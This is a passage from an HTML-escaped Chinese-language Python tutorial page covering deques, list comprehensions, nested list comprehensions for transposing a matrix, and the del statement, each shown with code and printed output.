queue &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; deque&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;999&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
queue&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;hhh&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
queue&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;aaaa&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;queue&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;queue&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;popleft&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;queue&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;popleft&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;queue&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
[1, 3, &#39;test&#39;, &#39;999&#39;, 33]
deque([1, 2, &#39;test&#39;, &#39;999&#39;, &#39;hhh&#39;, &#39;aaaa&#39;])
1
2
deque([&#39;test&#39;, &#39;999&#39;, &#39;hhh&#39;, &#39;aaaa&#39;])
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;列表推导式&#34;&gt;&lt;a href=&#34;#列表推导式&#34; class=&#34;headerlink&#34; title=&#34;列表推导式&#34;&gt;&lt;/a&gt;列表推导式&lt;/h4&gt;&lt;p&gt;列表推导式提供了从序列创建列表的简单途径。应用程序将一些操作应用于某个序列的每个元素，用其获得的结果作为生成新列表的元素，或者根据确定的判定条件创建子序列。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;var &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
vvar &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; var&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;vvar&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
vvaar &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; var&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;vvaar&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
var1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; dcc&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;   ssss&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;strip&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; var1&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
var2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
var3 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;x &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; y &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; var &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; y &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; var2&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; var2&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;round&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;355&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;113&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
[1, 2, 4, 8]
[2, 4, 8, 16]
[[1, 2], [2, 4], [4, 8], [8, 16]]
[&#39;dcc&#39;, &#39;ssss&#39;]
[2, 3, 4, 4, 4, 6, 8, 8, 8, 12, 16, 16, 16, 24, 32, 32]
[2, 6, 16, 32]
[&#39;3.1&#39;, &#39;3.14&#39;, &#39;3.142&#39;, &#39;3.1416&#39;, &#39;3.14159&#39;]
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;嵌套列表解析&#34;&gt;&lt;a href=&#34;#嵌套列表解析&#34; class=&#34;headerlink&#34; title=&#34;嵌套列表解析&#34;&gt;&lt;/a&gt;嵌套列表解析&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;matrix &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;matrix&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;row&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; row &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; matrix&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 3*4转为4*3&lt;/span&gt;
matrix &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
transposed &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    transposed&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;row&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; row &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; matrix&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;transposed&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
matrix &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
transposed &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;# the following 3 lines implement the nested listcomp&lt;/span&gt;
    transposed_row &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; row &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; matrix&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        transposed_row&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;row&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
	transposed&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;transposed_row&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;transposed&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
[[1, 2, 3, 4], [2, 3, 4, 5], [3, 4, 5, 6]]
[[1, 2, 3], [2, 3, 4], [3, 4, 5], [4, 5, 6]]
[[1, 2, 3], [2, 3, 4], [3, 4, 5], [4, 5, 6]]
[[1, 2, 3], [2, 3, 4], [3, 4, 5], [4, 5, 6]]
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;del语句&#34;&gt;&lt;a href=&#34;#del语句&#34; class=&#34;headerlink&#34; title=&#34;del语句&#34;&gt;&lt;/a&gt;del语句&lt;/h4&gt;&lt;p&gt;使用 del 语句可以从一个列表中依索引而不是值来删除一个元素。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;var &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;del&lt;/span&gt; var&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
